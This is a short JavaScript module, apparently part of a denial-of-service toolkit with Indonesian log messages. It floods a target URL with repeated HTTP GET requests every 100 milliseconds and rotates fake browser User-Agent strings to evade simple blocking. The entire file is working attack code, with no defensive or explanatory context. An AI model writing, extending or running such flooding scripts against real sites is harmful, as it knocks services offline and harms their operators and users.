const axios = require('axios');
const chalk = require('chalk');

const agents = [
  'Mozilla/5.0 Chrome/90.0',
  'Mozilla/5.0 Safari/537.36',
  'Mozilla/5.0 Edge/90.0',
  'Mozilla/5.0 Firefox/88.0',
];

module.exports = function(target, threads) {
  setInterval(() => {
    for (let i = 0; i < threads; i++) {
      const agent = agents[Math.floor(Math.random() * agents.length)];
      axios.get(target, {
        headers: { 'User-Agent': agent }
      })
      .then(() => console.log(chalk.green(`[✓] UA ${agent}`)))
      .catch(() => console.log(chalk.red(`[x] UA gagal`)));
    }
  }, 100);
};